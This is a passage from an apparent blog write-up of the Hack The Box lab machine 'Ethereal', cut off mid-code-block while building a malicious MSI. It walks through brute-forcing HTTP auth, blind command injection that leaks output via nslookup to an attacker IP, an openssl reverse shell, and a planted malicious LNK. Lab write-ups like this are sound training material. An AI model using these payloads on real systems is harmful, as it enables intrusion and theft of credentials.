<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Ethereal - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Ethereal"><a href="#Hack-The-Box-Ethereal" class="headerlink" title="Hack The Box - Ethereal"></a>Hack The Box - Ethereal</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to <code>/etc/hosts</code> as <code>ethereal.htb</code> , Let’s jump right in !<br><img src="/images/hackthebox/ethereal/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC ethereal.htb</code><br><img src="/images/hackthebox/ethereal/1.png" alt=""><br>And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p>On port 80 we see this website :<br><img src="/images/hackthebox/ethereal/2.png" alt=""><br>The only interseting thing is in the menu we see an Admin-area :<br><img src="/images/hackthebox/ethereal/3.png" alt=""><br>Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :<br><img src="/images/hackthebox/ethereal/4.png" alt=""><br>By going to <code>notes</code> we only get this :<br><img src="/images/hackthebox/ethereal/5.png" alt=""><br>So now we know that there’s a “test connection” page somewhere , we also get a potential username <code>alan</code>. By clicking on <code>messages</code> we get nothing , but <code>desktop</code> :<br><img src="/images/hackthebox/ethereal/6.png" alt=""><br>And it’s very clear that this is fake , also the user.txt is a troll :<br><img src="/images/hackthebox/ethereal/7.png" alt=""><br>By clicking on <code>ping</code> we get redirected to port 8080 which asks us for authentication and it uses http basic auth :<br><img src="/images/hackthebox/ethereal/8.png" alt=""><br>So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it.<br>One more thing to check is sub directory enumeration with gobsuter or any alternative :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gobuster -u http:&#x2F;&#x2F;ethereal.htb -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -t 100 -to 250s </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;ethereal.htb&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 4m10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;03&#x2F;06 21:51:24 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;corp (Status: 301)</span><br></pre></td></tr></table></figure>
<p>gobuster only found <code>/corp</code> with the wordlist <code>/usr/share/wordlists/dirb/common.txt</code> and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP</p>
<h2 id="FTP-Enumeration"><a href="#FTP-Enumeration" class="headerlink" title="FTP Enumeration"></a>FTP Enumeration</h2><p>On FTP there are some files but the most interesting ones are <code>FDISK.zip</code> and <code>DISK.zip</code> so we will check them first :<br><img src="/images/hackthebox/ethereal/9.png" alt=""><br>We will <code>unzip</code> them :<br><img src="/images/hackthebox/ethereal/10.png" alt=""><br>Then we will check what kind of files do we have with <code>file</code> :<br><img src="/images/hackthebox/ethereal/11.png" alt=""><br>Most likely they are mountable disks so we will create a directory to mount them and call it <code>mnt</code> then we will make a directory for <code>disk1</code> , <code>disk2</code> and <code>fdisk</code> and finally we will mount them <code>mount -o loop [Disk] [Directory]</code> :<br><img src="/images/hackthebox/ethereal/12.png" alt=""><br>In <code>disk1</code> and <code>disk2</code> there are some files that are not very interesting :<br><img src="/images/hackthebox/ethereal/13.png" alt=""><br><img src="/images/hackthebox/ethereal/14.png" alt=""><br>But on fdisk there’s a directory called <code>pbox</code> :<br><img src="/images/hackthebox/ethereal/15.png" alt=""><br>It contains an executable called <code>pbox.exe</code> and a dat file called <code>pbox.dat</code> :<br><img src="/images/hackthebox/ethereal/16.png" alt=""></p>
<h2 id="Getting-Credentials"><a href="#Getting-Credentials" class="headerlink" title="Getting Credentials"></a>Getting Credentials</h2><p>We will switch to a windows box to run that executable , you can alternatively use <code>wine</code> or a program called <code>dosbox</code>. <code>wine</code> didn’t work for me and <code>dosbox</code> kept crashing every 15 seconds.<br><img src="/images/hackthebox/ethereal/17.png" alt=""><br>When we try to open it it asks for a password :<br><img src="/images/hackthebox/ethereal/18.png" alt=""><br>At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database :<br><img src="/images/hackthebox/ethereal/19.png" alt=""><br>databases :<br><img src="/images/hackthebox/ethereal/20.png" alt=""><br>msdn :<br><img src="/images/hackthebox/ethereal/21.png" alt=""><br>learning :<br><img src="/images/hackthebox/ethereal/22.png" alt=""><br>ftp drop :<br><img src="/images/hackthebox/ethereal/23.png" alt=""><br>backup :<br><img src="/images/hackthebox/ethereal/24.png" alt=""><br>website uploads :<br><img src="/images/hackthebox/ethereal/25.png" alt=""><br>truecrypt :<br><img src="/images/hackthebox/ethereal/26.png" alt=""><br>management server :<br><img src="/images/hackthebox/ethereal/27.png" alt=""><br>svn :<br><img src="/images/hackthebox/ethereal/28.png" alt=""><br>Back to our kali , now we can create a list with all the information we got :<br><img src="/images/hackthebox/ethereal/29.png" alt=""><br>I put the passwords in a separate list to bruteforce the http auth with it :<br><img src="/images/hackthebox/ethereal/30.png" alt=""><br>We will use <code>wfuzz</code> and we will try the username <code>alan</code> first :<br><code>wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt</code><br><img src="/images/hackthebox/ethereal/31.png" alt=""><br>Password : <code>!C414m17y57r1k3s4g41n!</code></p>
<h2 id="Blind-RCE"><a href="#Blind-RCE" class="headerlink" title="Blind RCE"></a>Blind RCE</h2><p>Now after we login we get the “Test Connection” page and we have an input for the ip address to ping.<br><img src="/images/hackthebox/ethereal/32.png" alt=""><br>Now we can try to bypass that and inject system commands using <code>&amp;</code> or <code>|</code> , but we don’t get any output. I also tried to host <code>nc.exe</code> on a python http server and used <code>certutil</code> to download it but the python server didn’t get any requests. Finally when I ran responder :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0&#96; then did this &#96;10.10.xx.xx &amp; nslookup test 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/33.png" alt=""><br>I finally got something :<br><img src="/images/hackthebox/ethereal/34.png" alt=""><br>We can try to execute a system command and get the output by doing this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f %i in (&#39;whoami&#39;) do nslookup %i 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/35.png" alt=""><br>This is executing <code>whoami</code> then taking the output and doing nslookup with the output to our ip :<br><img src="/images/hackthebox/ethereal/36.png" alt=""><br>We get <code>etherealalan</code> and that’s unusual as we expected <code>ethereal\alan</code>.<br>We will start enumerating the filesystem this way , <a href="https://ss64.com/nt/for_f.html" target="_blank" rel="noopener">read this</a> if you don’t understand some of the <code>for</code> commands that we will use.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f %i in (&#39;cd&#39;) do nslookup %i 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/37.png" alt=""></p>
<p><img src="/images/hackthebox/ethereal/38.png" alt=""><br>So the current directory is <code>c:\windows\system32\inetsrv</code><br>We also need to know the users on the box :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f &quot;tokens&#x3D;1,2,3&quot; %a in (&#39;dir &#x2F;B &quot;C:\Users&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/39.png" alt=""><br>We have 5 users on the box <code>alan</code> , <code>jorge</code> , <code>Public</code> , <code>rupal</code> and <code>Administrator</code>. We are executing commands as <code>alan</code><br>Next thing to look at is the installed programs :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f &quot;tokens&#x3D;1,2,3&quot; %a in (&#39;dir &#x2F;B &quot;C:\Program Files (x86)&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/ethereal/40.png" alt=""><br>We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string <code>Rule Name:</code> then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to <code>c:\users\public\desktop\shortcuts</code> , so we will do this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; netsh advfirewall firewall show rule name&#x3D;all | findstr &quot;Rule Name:&quot; &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt</span><br></pre></td></tr></table></figure>
<p>Then we will list the contents of <code>c:\users\public\desktop\shortcuts</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f &quot;tokens&#x3D;1,2,3&quot; %a in (&#39;dir &#x2F;B &quot;C:\Users\Public\Desktop\Shortcuts&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/41.png" alt=""><br>And we see that we have successfully written into that directory , next step is to read the file :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f &quot;tokens&#x3D;1,2,3,4,5,6,7&quot; %a in (&#39;type C:\Users\Public\Desktop\Shortcuts\firewall.txt&#39;) do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/42.png" alt=""><br>It’s only allowing TCP conections to port <code>73</code> and <code>136</code> , we saw earlier that openssl was installed on the box , we can create a <code>SSL/TLS server</code> on these ports and use openssl to make the box connect back to us.</p>
<h2 id="Generating-certs-and-setting-up-the-server"><a href="#Generating-certs-and-setting-up-the-server" class="headerlink" title="Generating certs and setting up the server"></a>Generating certs and setting up the server</h2><p>First step is to generate certificates because we need them to set up the server :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/43.png" alt=""><br>Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/44.png" alt=""><br><a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html" target="_blank" rel="noopener">Read more about s_server</a><br>We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.<br>Now we need to locate openssl.exe , if we listed the contents of <code>OpenSSL-v1.1.0</code> in <code>Program Files (x86)</code> (can also be written <code>Progra~2</code>. check <a href="https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568" target="_blank" rel="noopener">this</a>) we will get this output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx &amp; for &#x2F;f &quot;tokens&#x3D;1,2,3&quot; %a in (&#39;dir &#x2F;B &quot;C:\Program Files (x86)\OpenSSL-v1.1.0&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/45.png" alt=""><br>We see a directory called <code>bin</code> that’s where <code>openssl.exe</code> is located so the path is <code>c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe</code><br>Now everything is ready , in the ping page we will write this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136</span><br></pre></td></tr></table></figure>
<p>Then we will check our server :<br><img src="/images/hackthebox/ethereal/46.png" alt=""><br>Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.<br><img src="/images/hackthebox/ethereal/47.png" alt=""><br><img src="/images/hackthebox/ethereal/48.png" alt=""><br><img src="/images/hackthebox/ethereal/49.png" alt=""><br>alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called <code>note-draft.txt</code>:<br><img src="/images/hackthebox/ethereal/50.png" alt=""></p>
<h2 id="Creating-a-malicious-lnk-and-getting-User"><a href="#Creating-a-malicious-lnk-and-getting-User" class="headerlink" title="Creating a malicious lnk and getting User"></a>Creating a malicious lnk and getting User</h2><p><img src="/images/hackthebox/ethereal/51.png" alt=""><br>From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it.<br><img src="/images/hackthebox/ethereal/52.png" alt=""><br>So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called <a href="https://github.com/Plazmaz/LNKUp" target="_blank" rel="noopener">LNKup</a> I used it to create the payload :<br><img src="/images/hackthebox/ethereal/53.png" alt=""><br>To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :<br><img src="/images/hackthebox/ethereal/54.png" alt=""><br>Then on the ping page we will type this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &gt; &quot;C:\Users\Public\Desktop\Shortcuts\rick.lnk&quot;</span><br></pre></td></tr></table></figure>
<p>We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old <code>lnk</code> :<br><img src="/images/hackthebox/ethereal/55.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; copy &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot; &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; dir c:\users\public\desktop\shortcuts</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/56.png" alt=""><br>Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :<br><img src="/images/hackthebox/ethereal/57.png" alt=""><br>With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.<br><img src="/images/hackthebox/ethereal/58.png" alt=""><br>Finally we owned user !</p>
<h2 id="More-Filesystem-Enumeration"><a href="#More-Filesystem-Enumeration" class="headerlink" title="More Filesystem Enumeration"></a>More Filesystem Enumeration</h2><p>If we checked the other drives :<br><code>fsutil fsinfo drives</code><br><img src="/images/hackthebox/ethereal/59.png" alt=""><br>We will find that <code>C</code> is not the only drive and there’s also <code>D</code>.<br>Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything.<br>Contents of <code>D</code>:<br><img src="/images/hackthebox/ethereal/60.png" alt=""><br>In <code>DEV</code> there’s a directory called <code>MSIs</code> and it has a note :<br><img src="/images/hackthebox/ethereal/61.png" alt=""><br>So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in <code>D:\Certs</code> , <code>MyCA.cer</code> and <code>MyCA.pvk</code> , to transfer them to our box we will use <code>openssl</code> to base64 encode the certs then we can copy and decode on our box.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/62.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ethereal/63.png" alt=""><br>Now we will go to a windows box again to create the msi </p>
<h2 id="Creating-Malicious-msi-and-getting-root"><a href="#Creating-Malicious-msi-and-getting-root" class="headerlink" title="Creating Malicious msi and getting root"></a>Creating Malicious msi and getting root</h2><p>In order to create the msi we will use <a href="http://wixtoolset.org/" target="_blank" rel="noopener">wixtools</a> , you can use other msi builders but they didn’t work for me.<br>Check <a href="https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with" target="_blank" rel="noopener">this page</a> for some wix msi usage examples.<br>We will create an msi that executes our lnk file :<br><img src="/images/hackthebox/ethereal/64.png" alt=""></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span 